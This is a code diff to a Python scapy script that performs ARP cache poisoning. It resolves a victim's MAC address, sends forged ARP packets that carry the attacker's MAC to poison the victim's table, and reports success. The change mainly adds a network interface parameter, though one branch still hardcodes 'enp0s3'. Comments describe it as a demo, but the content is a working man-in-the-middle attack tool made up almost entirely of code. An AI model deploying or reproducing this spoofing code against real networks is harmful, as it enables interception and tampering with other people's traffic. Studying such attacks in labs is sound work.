@@ -2,9 +2,12 @@ from scapy.all import *
 
 #get MAC from ip
 #for demo purposes, interface enp0s3 is used
-def getmac(ip):
+def getmac(ip, interface):
     packet = Ether() / ARP(op = ARP.who_has, pdst = ip)
-    ans = srp1(packet, verbose = False, timeout = 10, iface = 'enp0s3')
+    if interface:
+        ans = srp1(packet, verbose = False, timeout = 10, iface = 'enp0s3')
+    else:
+        ans = srp1(packet, verbose = False, timeout = 10)
     if ans[ARP] and ans[ARP].hwsrc:
         return ans[ARP].hwsrc
     else:
@@ -21,7 +24,7 @@ def gethostmac():
             break
     return hostmac
    
-def arpspoof(macAttacker, macVictim, ipToSpoof, ipVictim):
+def arpspoof(macAttacker, macVictim, ipToSpoof, ipVictim, interface):
     #create ARP packet
     arp = Ether() / ARP()
     arp[Ether].src = macAttacker
@@ -30,13 +33,17 @@ def arpspoof(macAttacker, macVictim, ipToSpoof, ipVictim):
     arp[ARP].hwdst = macVictim
     arp[ARP].pdst = ipVictim
     #send ARP packet to spoof
-    sendp(arp, iface = 'enp0s3')
+    if interface:
+        sendp(arp, iface = interface)
+    else:
+        sendp(arp)
+    print 'Poisoned ARP table of ' + ipVictim
     
-def arppoison(victimIP, ipToSpoof, attackerIP):
-    victimMAC = getmac(victimIP)
+def arppoison(victimIP, ipToSpoof, attackerIP, interface):
+    victimMAC = getmac(victimIP, interface)
     if victimMAC == None:
         print colores.ORANGE + 'Cannot find MAC address of victim\n' + colores.RED + 'End of program' + colores.RESETALL
         sys.exit()
-    #for demo, suppose enp0s3 interface is used
+    #for demo, make sure enp0s3 interface is used
     attackerMAC = gethostmac()
-    arpspoof(attackerMAC, victimMAC, ipToSpoof, victimIP)
+    arpspoof(attackerMAC, victimMAC, ipToSpoof, victimIP, interface)
